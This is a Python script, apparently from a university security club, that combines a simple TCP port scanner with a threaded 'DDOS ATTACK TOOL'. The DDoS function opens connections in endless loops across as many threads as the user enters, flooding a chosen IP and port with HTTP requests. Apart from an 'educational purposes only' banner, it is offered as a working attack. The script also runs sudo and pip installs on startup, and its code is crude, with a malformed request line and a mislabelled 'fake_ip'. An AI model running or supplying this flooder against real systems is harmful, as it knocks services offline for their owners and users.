import socket, threading, subprocess, sys, os, time
from datetime import datetime
attack_num =0
print("to run me you need to install some packages and libraries run install.sh to install them if you had not installed them earlier".upper())
os.system("sudo apt-get install python3")
os.system("pip install socket")
os.system("pip install threading")
os.system("pip install subprocess")
os.system("pip install colorama")

def main():
    print("*"*61)
    print('''
THE TOOL IS DEVELOPED BY KISII UNIVERSITY CYBER SECURITY CLUB
                MORE UPDATES COMING
USE IT ON UNIX SHELLS ONLY AND FOR EDUCATIONAL PURPOSES ONLY!
                #CODDED BY CYB37 V3N0M#''')

    print("*"*61)
    print('''
CHOOSE BETWEEN THE FOLLOWING OPTIONS:
        1. CHOOSE 1 FOR PORT SCAN
        2. CHOOSE 2 FOR DDOS ATTACK TOOL ''')
    option = input("Enter your option: ")
    if option == "1":
        portscan()
    elif option == "2":
        run()
    else:
        os.system("clear")
        print("Wrong option string inserted please try again")
        time.sleep(1)
        os.system("clear")
        main()

# port scanning
def portscan():
    # Clear the screen
    subprocess.call('clear', shell=True)
    target = input("enter target ip address e.g 127.0.0.1: ".upper())
    url = socket.gethostbyaddr(target)
    print(url)
    # Ask for input
    remoteServer = input("Enter a remote host to scan: ")
    remoteServerIP = socket.gethostbyname(remoteServer)

    # Print a nice banner with information on which host we are about to scan
    print("-" * 60)
    print("Please wait, scanning remote host", remoteServerIP)
    print("-" * 60)

    # Check what time the scan started
    t1 = datetime.now()

    # Using the range function to specify ports (here it will scans all ports between 1 and 1024)

    # We also put in some error handling for catching errors

    try:
        for port in range(1, 1025):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            result = sock.connect_ex((remoteServerIP, port))
            if result == 0:
                print("Port {}: 	 Open".format(port))
            sock.close()

    except KeyboardInterrupt:
        print("You pressed Ctrl+C")
        time.sleep(2)
        os.system("clear")
        sys.exit()

    except socket.gaierror:
        print('Hostname could not be resolved. Exiting')
        time.sleep(2)
        os.system('clear')
        sys.exit()

    except socket.error:
        print("Couldn't connect to server")
        time.sleep(2)
        os.system("clear")
        sys.exit()

    # Checking the time again
    t2 = datetime.now()

    # Calculates the difference of time, to see how long it took to run the script
    total = t2 - t1

    # Printing the information to screen
    print('Scanning Completed in: ', total)
def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode("ascii"), (target, port))
        global attack_num
        attack_num = attack_num + 1
        print(attack_num)
        s.close()
def run():

    global target
    target = input("enter target ip address e.g 127.0.0.1: ".upper())
    global url
    url = socket.gethostbyaddr(target)
    print("wait as i gather host's information")
    global fake_ip
    print(f"The {target} is {url}")
    fake_ip = socket.gethostbyname(socket.gethostname())
    global port
    port = int(input("Enter target port: "))
    threads = int(input("Enter the number of threads you like to send: ".upper()))
    progress = 1
    while progress < 100:
        print("."*progress, f"{progress}% loading...")
        time.sleep(0.5)
        os.system("clear")
        progress += 1
    else:
        for  i in range(threads):
            thread = threading.Thread(target=attack, args=())
            thread.start()
main()
